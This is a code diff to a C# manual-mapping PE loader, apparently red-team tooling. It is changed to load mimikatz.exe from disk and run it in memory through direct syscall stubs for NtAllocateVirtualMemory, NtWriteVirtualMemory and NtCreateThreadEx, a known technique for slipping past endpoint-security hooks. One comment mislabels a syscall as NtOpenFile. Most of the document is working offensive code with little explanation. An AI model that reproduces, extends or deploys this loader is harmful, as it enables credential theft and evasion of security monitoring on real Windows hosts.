@@ -15,9 +15,7 @@ namespace PELoader
         public static void Main()
         {
 
-            string peAsString = "base64pe";
-
-            byte[] unpacked = System.Convert.FromBase64String(peAsString);
+           byte[] unpacked = File.ReadAllBytes(@"C:\tools\mimikatz\mimikatz.exe");
             PE.PE_MANUAL_MAP mapPE = Map.MapModuleToMemory(unpacked);
             DynamicGeneric.CallMappedPEModule(mapPE.PEINFO, mapPE.ModuleBase);
             Console.ReadLine();
@@ -997,21 +995,31 @@ namespace PELoader
             // Alloc PE image memory -> RW
             IntPtr BaseAddress = IntPtr.Zero;
 
-            //IntPtr pNtAllocateVirtualMemory = DynamicGeneric.GetSyscallStub("NtAllocateVirtualMemory");
-            //DynamicNative.DELEGATES.NtAllocateVirtualMemory fSyscallNtAllocateVirtualMemory = (DynamicNative.DELEGATES.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(pNtAllocateVirtualMemory, typeof(DynamicNative.DELEGATES.NtAllocateVirtualMemory));
+
+            // Syscall NtAllocateVirtualMemory
+            IntPtr pNtAllocateVirtualMemory = DynamicGeneric.GetSyscallStub("NtAllocateVirtualMemory");
+            DynamicNative.DELEGATES.NtAllocateVirtualMemory fSyscallNtAllocateVirtualMemory = (DynamicNative.DELEGATES.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(pNtAllocateVirtualMemory, typeof(DynamicNative.DELEGATES.NtAllocateVirtualMemory));
 
             IntPtr RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;
-            /*IntPtr pImage = fSyscallNtAllocateVirtualMemory(
+            uint result = fSyscallNtAllocateVirtualMemory(
                 (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
                 Win32.Kernel32.MEM_COMMIT | Win32.Kernel32.MEM_RESERVE,
                 Win32.WinNT.PAGE_READWRITE
-            );*/
+            );
 
-            IntPtr pImage = DynamicNative.NtAllocateVirtualMemory(
-            (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
-            Win32.Kernel32.MEM_COMMIT | Win32.Kernel32.MEM_RESERVE,
-            Win32.WinNT.PAGE_READWRITE
-        );
+            IntPtr pImage = IntPtr.Zero;
+
+            if (result == 0)
+            {
+                Console.WriteLine("Successfully allocated memory!");
+                pImage = BaseAddress;
+            }
+            else
+            {
+                Console.WriteLine("Failed to allocate memory, StatusCode: {0}", result);
+            }
+
+            
             return MapModuleToMemory(pModule, pImage, PEINFO);
         }
 
@@ -1038,6 +1046,11 @@ namespace PELoader
         /// <returns>PE_MANUAL_MAP object</returns>
         public static PE.PE_MANUAL_MAP MapModuleToMemory(IntPtr pModule, IntPtr pImage, PE.PE_META_DATA PEINFO)
         {
+
+            // Syscall NtWriteVirtualMemory
+            IntPtr pNtWriteVirtualMemory = DynamicGeneric.GetSyscallStub("NtWriteVirtualMemory");
+            DynamicNative.DELEGATES.NtWriteVirtualMemory fSyscallNtWriteVirtualMemory = (DynamicNative.DELEGATES.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(pNtWriteVirtualMemory, typeof(DynamicNative.DELEGATES.NtWriteVirtualMemory));
+
             // Check module matches the process architecture
             if ((PEINFO.Is32Bit && IntPtr.Size == 8) || (!PEINFO.Is32Bit && IntPtr.Size == 4))
             {
@@ -1047,7 +1060,17 @@ namespace PELoader
 
             // Write PE header to memory
             UInt32 SizeOfHeaders = PEINFO.Is32Bit ? PEINFO.OptHeader32.SizeOfHeaders : PEINFO.OptHeader64.SizeOfHeaders;
-            UInt32 BytesWritten = DynamicNative.NtWriteVirtualMemory((IntPtr)(-1), pImage, pModule, SizeOfHeaders);
+            UInt32 BytesWritten = 0;
+            uint result = fSyscallNtWriteVirtualMemory((IntPtr)(-1), pImage, pModule, SizeOfHeaders, ref BytesWritten);
+
+            if (result == 0)
+            {
+                Console.WriteLine("Successfully wrote PE header");
+            }
+            else
+            {
+                Console.WriteLine("Failed to write PE header, StatusCode: {0}", result);
+            }
 
             // Write sections to memory
             foreach (PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
@@ -1057,10 +1080,18 @@ namespace PELoader
                 IntPtr pRawSectionBase = (IntPtr)((UInt64)pModule + ish.PointerToRawData);
 
                 // Write data
-                BytesWritten = DynamicNative.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
+                result = fSyscallNtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData, ref BytesWritten);
                 if (BytesWritten != ish.SizeOfRawData)
                 {
                     throw new InvalidOperationException("Failed to write to memory.");
+                }
+                if (result == 0)
+                {
+                    Console.WriteLine("Successfully wrote section {0}", ish.Section);
+                }
+                else
+                {
+                    Console.WriteLine("Failed to write section {0}, StatusCode: {1}", ish.Name, result);
                 }
             }
 
@@ -3911,8 +3942,12 @@ namespace PELoader
             IntPtr lpStartAddress = PEINFO.Is32Bit ? (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader32.AddressOfEntryPoint) :
                                                      (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader64.AddressOfEntryPoint);
 
-            DynamicNative.NtCreateThreadEx(
-                ref hRemoteThread,
+            // Syscall NtOpenFile
+            IntPtr pNtCreateThreadEx = DynamicGeneric.GetSyscallStub("NtCreateThreadEx");
+            DynamicNative.DELEGATES.NtCreateThreadEx fSyscallNtCreateThreadEx = (DynamicNative.DELEGATES.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(pNtCreateThreadEx, typeof(DynamicNative.DELEGATES.NtCreateThreadEx));
+
+            fSyscallNtCreateThreadEx(
+                out hRemoteThread,
                 Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL,
                 IntPtr.Zero, (IntPtr)(-1),
                 lpStartAddress, IntPtr.Zero,
